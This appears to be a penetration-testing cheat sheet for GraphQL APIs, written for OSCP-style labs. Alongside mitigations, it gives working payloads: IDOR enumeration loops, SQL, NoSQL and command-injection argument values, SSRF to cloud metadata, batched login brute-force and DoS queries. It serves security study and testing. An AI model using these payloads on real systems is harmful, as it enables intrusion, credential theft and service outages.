# GraphQL

> GraphQL is a query language and runtime for APIs. Unlike REST, it exposes a single endpoint (`/graphql`) and a schema that clients can introspect. Misconfigurations in GraphQL expose the entire data model, allow unauthorized queries (IDOR, mass assignment), and enable DoS via deeply nested queries. This file covers detection, enumeration, exploitation, and OSCP evidence.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [Detection](#1-detection)
2. [GraphQL Basics](#2-graphql-basics)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Vulnerabilities and Exploitation](#5-vulnerabilities-and-exploitation)
6. [Tooling](#6-tooling)
7. [Post-Exploitation](#7-post-exploitation)
8. [OSCP Notes](#8-oscp-notes)
9. [References](#9-references)

---

## 1. Detection

GraphQL endpoints are typically at:

- `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`, `/gql`.
- `/graphql/console` (GraphiQL IDE - often left enabled in dev).

Detection signals:

- Response to `GET /graphql` returns `{"errors":[{"message":"..."}]}` or GraphQL-specific JSON.
- Response to `POST /graphql` with `{"query":"{__typename}"}` returns `{"data":{"__typename":"Query"}}`.
- Response headers: `X-Powered-By: express-graphql`, `apollo-server`, etc.
- WebSocket endpoint `/graphql` with `graphql-ws` or `subscriptions-transport-ws` subprotocol.

### Quick detection

```bash
# GET probe
curl -s -i $TARGET/graphql | head -20

# POST probe - ask for the root type
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}'

# Introspection probe
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}'
```

Expected output (successful GraphQL):

```json
{"data":{"__typename":"Query"}}
```

Expected output (introspection enabled):

```json
{"data":{"__schema":{"types":[{"name":"Query"},{"name":"User"},{"name":"Post"}]}}}
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `{"data":{"__typename":"Query"}}` | Valid GraphQL endpoint | Run introspection |
| `{"errors":[{"message":"GraphQL ..."}]}` | GraphQL present, misconfigured | Enumerate schema |
| Introspection returns types | Introspection enabled | Dump full schema |
| Introspection disabled | Hardened | Fall back to field guessing |
| `/graphiql` responds 200 | IDE enabled | Use browser to explore |
| `subscriptions-transport-ws` in WS | Subscriptions | Test auth on WS |

---

## 2. GraphQL Basics

### 2.1 Operations

Three operation types: `query`, `mutation`, `subscription`.

```graphql
query GetUser($id: ID!) {
  user(id: $id) {
    id
    username
    email
  }
}

mutation CreatePost($input: PostInput!) {
  createPost(input: $input) {
    id
    title
  }
}

subscription OnNewPost {
  postAdded {
    id
    title
  }
}
```

### 2.2 Introspection

The `__schema`, `__type`, `__typename` meta-fields expose the schema.

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

### 2.3 Error-based discovery

If introspection is disabled, invalid queries reveal field names:

```graphql
{
  usr {
    id
  }
}
```

Response:

```json
{"errors":[{"message":"Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"}]}
```

The `Did you mean` hint is a goldmine for field enumeration.

---

## 3. Enumeration

### 3.1 Introspection (if enabled)

```bash
# Full introspection dump with graphql-cop or InQL
python3 -m pip install graphql-cop
graphql-cop -t $TARGET/graphql

# Or inql (Burp extension) for GUI
```

Save introspection result:

```bash
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}' | jq . > schema.json
```

### 3.2 Field guessing (introspection disabled)

Use wordlists of common field names: `user`, `users`, `me`, `admin`, `login`, `auth`, `password`, `email`, `role`, `flag`, `secret`, `token`, `apikey`, `debug`.

```bash
while read -r field; do
  resp=$(curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{$field{__typename}}\"}")
  if echo "$resp" | grep -q '"__typename"'; then
    echo "HIT: $field -> $resp"
  fi
done < graphql-fields.txt
```

Sample `graphql-fields.txt`:

```text
user
users
me
viewer
admin
admins
login
register
resetPassword
flag
secret
token
apikey
debug
systemInfo
config
```

### 3.3 Argument enumeration via error hints

```graphql
{
  user {
    id
  }
}
```

Response hint:

```json
{"errors":[{"message":"Field \"user\" argument \"id\" of type \"ID!\" is required, but it was not provided."}]}
```

This reveals required arguments and their types.

### 3.4 GraphQL IDE (GraphiQL)

If `/graphiql` or `/graphql/console` is accessible, the schema browser exposes everything interactively. Often left enabled in dev/staging.

### 3.5 Schema in Apollo Studio

Check for `apollo-server` traces:

- `/.well-known/apollo/server-health`.
- `apollo-server-landing-page` HTML at the root.

---

## 4. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| Introspection enabled | Schema exposed | Full data model leak |
| No auth on schema | Introspection without auth | Attack surface exposed to anonymous |
| IDOR in arguments | Sequential IDs | Access other users' data |
| Mass assignment | Mutation accepts extra fields | Role escalation |
| Missing authorization | Query without auth check | Data leak |
| Nested query DoS | No depth limit | DoS |
| Alias overloading | No complexity limit | DoS |
| Batching | No limit | Brute-force, DoS |
| Injection in arguments | Unsanitized input | SQLi / NoSQLi / command injection |
| Debug/GraphiQL in prod | IDE enabled | Direct exploitation |
| Field suggestions | `Did you mean` leaks | Schema leak |
| SSRF via resolver | Resolver fetches URL | SSRF |
| Field-level auth bypass | Auth only on some fields | Data leak |

---

## 5. Vulnerabilities and Exploitation

### 5.1 Introspection enabled (schema disclosure)

**Root cause:** GraphQL servers ship with introspection enabled by default. In production, this exposes the full schema.

**Exploit:**

```bash
# Dump schema
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name fields{name type{name kind}}}}}"}' | jq .

# Better: use graphql-cop or InQL for readable output
graphql-cop -t $TARGET/graphql
```

Expected output:

```json
{
  "data": {
    "__schema": {
      "types": [
        {"name": "Query", "fields": [{"name": "user"},{"name": "users"},{"name": "admin"}]},
        {"name": "User", "fields": [{"name": "id"},{"name": "email"},{"name": "password"}]}
      ]
    }
  }
}
```

> [!IMPORTANT]
> OSCP report: screenshot the introspection query and the returned schema (types + fields). Highlight sensitive fields (`password`, `token`, `admin`, `flag`).

**Mitigation:** disable introspection in production; keep it in dev only.

---

### 5.2 IDOR via arguments

**Root cause:** Query arguments like `id` are used without ownership checks.

**Exploit:**

```graphql
query {
  user(id: 2) {
    id
    username
    email
  }
}
```

Change `id: 1` (your own) to `id: 2`, `id: 3`, etc. to enumerate.

Batch enumeration:

```bash
for id in $(seq 1 100); do
  resp=$(curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{user(id:$id){id username email}}\"}")
  echo "id=$id -> $resp"
done
```

> [!IMPORTANT]
> OSCP report: screenshot the query for your own ID, then the query for another user's ID returning their data.

**Mitigation:** enforce authorization per-resolver; never trust client-supplied IDs.

---

### 5.3 Mass assignment via mutations

**Root cause:** Mutation input types accept fields the developer did not intend to be user-controllable (e.g. `role`, `isAdmin`, `verified`).

**Exploit:**

```graphql
mutation {
  updateUser(input: {
    id: 1
    username: "attacker"
    role: "admin"
  }) {
    id
    username
    role
  }
}
```

If the server accepts `role`, privilege escalation.

> [!IMPORTANT]
> OSCP report: screenshot the mutation request with the extra field and the response showing the elevated role.

**Mitigation:** whitelist allowed fields in input types; strip unexpected fields.

---

### 5.4 Missing authorization on query

**Root cause:** Some fields do not enforce auth. Even if login is required, an anonymous or low-privilege user can access sensitive fields.

**Exploit:**

```graphql
query {
  allUsers {
    id
    email
    password
  }
}
```

Test anonymously (no `Authorization` header) and with a low-privilege token.

> [!IMPORTANT]
> OSCP report: screenshot the query with a low-privilege token returning sensitive data.

**Mitigation:** field-level authorization; use a directive like `@auth` on every protected field.

---

### 5.5 Nested query DoS (resource exhaustion)

**Root cause:** No query depth / complexity limit. Recursive relationships (`user -> posts -> author -> posts -> ...`) explode.

**Exploit:**

```graphql
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author { id }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Send a deeply nested query. If the server hangs or returns a timeout, DoS is confirmed.

> [!IMPORTANT]
> OSCP report: screenshot the deeply nested query and the timeout/error response. **Do NOT run this against production** - it will cause an outage.

**Mitigation:** depth limit (e.g. `maxDepth=7`), complexity scoring, query cost analysis, timeout per request.

---

### 5.6 Alias overloading

**Root cause:** No limit on the number of aliases. Attackers duplicate expensive fields thousands of times in one query.

**Exploit:**

```graphql
query {
  a1: expensiveField
  a2: expensiveField
  a3: expensiveField
  # ... repeated 1000 times
}
```

> [!IMPORTANT]
> OSCP report: screenshot the alias-batched query and the response time/latency.

**Mitigation:** limit aliases per query; complexity scoring counts each alias.

---

### 5.7 Batching (brute-force / DoS)

**Root cause:** The server accepts an array of queries in one HTTP request. Useful for brute-forcing passwords, OTPs, or tokens without rate-limiting.

**Exploit:**

```bash
# Array batching (Apollo)
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '[
  {"query":"mutation{login(user:\"admin\",pass:\"123456\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"password\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"admin\"){token}}"}
]'

# Alias batching
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"mutation{a:login(user:\"admin\",pass:\"123456\"){token} b:login(user:\"admin\",pass:\"password\"){token}}"}'
```

> [!IMPORTANT]
> OSCP report: screenshot the batched request and any successful login (rate-limit bypass).

**Mitigation:** disable batching, or limit batch size; rate-limit per query, not per HTTP request.

---

### 5.8 Injection in arguments (SQLi / NoSQLi / command injection)

**Root cause:** Resolvers pass user input directly to backend queries.

**SQLi:**

```graphql
query {
  user(id: "1' OR '1'='1") {
    id
    username
  }
}
```

**NoSQLi (MongoDB):**

```graphql
query {
  user(filter: {username: {$ne: null}, password: {$ne: null}}) {
    id
    username
  }
}
```

**Command injection:**

```graphql
mutation {
  ping(host: "127.0.0.1; id") {
    output
  }
}
```

> [!IMPORTANT]
> OSCP report: screenshot the malicious argument value, the resulting query (if visible), and the injected output (e.g. `uid=33(www-data)`).

**Mitigation:** parameterized queries; input validation; never pass raw GraphQL args to shell.

---

### 5.9 SSRF via resolver

**Root cause:** A resolver fetches a URL supplied by the user (e.g. avatar import, webhook, URL preview).

**Exploit:**

```graphql
mutation {
  importAvatar(url: "http://169.254.169.254/latest/meta-data/") {
    url
    preview
  }
}
```

Test internal hosts: `http://127.0.0.1:8080`, `http://169.254.169.254/`, `http://[::1]/`.

> [!IMPORTANT]
> OSCP report: screenshot the mutation with the internal URL and the returned metadata/response.

**Mitigation:** URL whitelist; block private IP ranges; use a metadata-blocking proxy.

---

### 5.10 Field suggestion leak (introspection disabled)

When introspection is off, some servers still return `Did you mean` hints.

**Exploit:**

```bash
for field in usr uzer user admin adminn flag flg; do
  resp=$(curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d "{\"query\":\"{$field{__typename}}\"}")
  echo "$field -> $resp"
done
```

Response:

```json
{"errors":[{"message":"Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"}]}
```

Parse the hints to reconstruct the schema.

**Mitigation:** disable suggestions (`didYouMean: false` in Apollo, or equivalent).

---

### 5.11 GraphiQL / Playground exposed

**Root cause:** Dev IDE enabled in production. Provides schema browser + query editor.

**Exploit:** visit `http://target/graphiql` in a browser. If it loads, use it to explore and exploit.

> [!IMPORTANT]
> OSCP report: screenshot the GraphiQL page URL and the schema browser showing the types/fields.

**Mitigation:** disable IDE endpoints in production; serve only at internal addresses.

---

## 6. Tooling

### graphql-cop

```bash
python3 -m pip install graphql-cop
graphql-cop -t $TARGET/graphql
```

Tests introspection, GET/POST, batch, alias, depth, suggestions.

### InQL (Burp extension)

- Install via BApp Store.
- Right-click on a GraphQL request -> Send to InQL.
- Generates schema + query templates.

### graphql-voyager

Visualize the schema:

```bash
# Save schema first
curl -s -X POST $TARGET/graphql -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name kind fields{name type{name kind}}}}}"}' > schema.json

# Paste into https://apis.guru/graphql-voyager/
```

### Altair GraphQL Client

Desktop app for interactive GraphQL. Supports environments, subscriptions, file upload.

### clairvoyance

Reconstruct schema when introspection is disabled, using field suggestion errors.

```bash
python3 -m pip install clairvoyance
clairvoyance $TARGET/graphql -o schema.json -w wordlist.txt
```

### graphql-path-enum

Enumerate paths between types.

```bash
python3 -m pip install graphql-path-enum
graphql-path-enum -i schema.json -t User
```

---

## 7. Post-Exploitation

After gaining access:

1. **Dump all users:** `query { allUsers { id email role } }`.
2. **Look for admin/flag fields:** `admin`, `flag`, `secret`, `config`.
3. **Trigger mutations:** `createUser`, `updateRole`, `deleteUser`.
4. **Check file upload mutations:** `uploadFile`, `importAvatar`.
5. **Enumerate subscriptions:** WebSocket channel may leak events.
6. **Extract tokens:** some queries return `refreshToken`, `apiKey`.
7. **Pivot to REST:** if the app also exposes REST endpoints, reuse the token.

```graphql
# Enumerate everything suspicious
query {
  me { id username email role apiKey }
  allUsers { id username email role }
  config { dbHost dbUser dbPass }
  systemInfo { version env }
}
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for GraphQL:
> - Screenshot the introspection query and the returned schema (full types + fields).
> - Screenshot the exploit query (IDOR, mass assignment, injection).
> - Screenshot the response with sensitive data (user list, admin token).
> - For DoS: screenshot the nested query and the timeout (do NOT test on production).
> - Include timestamps.

> [!IMPORTANT]
> If introspection is disabled, use `clairvoyance` to reconstruct the schema. Screenshot the reconstructed schema and the field-suggestion errors that revealed it.

> [!IMPORTANT]
> For batched brute-force, screenshot the batched request and the successful credential match. This is the evidence for rate-limit bypass.

**Common OSCP pitfalls:**

- Some endpoints only accept `POST`. If `GET` returns 405, retry with `POST`.
- Introspection may be partially disabled (only `__schema` is blocked). Try `__type` directly: `{__type(name:"User"){name fields{name}}}`.
- The `graphql` endpoint may be behind auth; try with/without `Authorization`.
- Subscriptions use WebSocket - use `wscat` or a Burp WS tab.
- Batching is not universal; check whether the server accepts arrays or only alias batches.

---

## 9. References

- GraphQL spec: https://spec.graphql.org/
- Introspection: https://graphql.org/learn/introspection/
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- PortSwigger GraphQL: https://portswigger.net/web-security/graphql
- HackTricks GraphQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
- graphql-cop: https://github.com/dolevf/graphql-cop
- InQL: https://github.com/doyensec/inql
- clairvoyance: https://github.com/nikitastupin/clairvoyance
- graphql-voyager: https://github.com/graphql-kit/graphql-voyager
- CVE-2019-13598 (GraphQL introspection in prod): https://nvd.nist.gov/vuln/detail/CVE-2019-13598
- CVE-2022-31836 (GraphQL DoS via batching): https://nvd.nist.gov/vuln/detail/CVE-2022-31836
- CVE-2023-25653 (graphql-java DoS): https://nvd.nist.gov/vuln/detail/CVE-2023-25653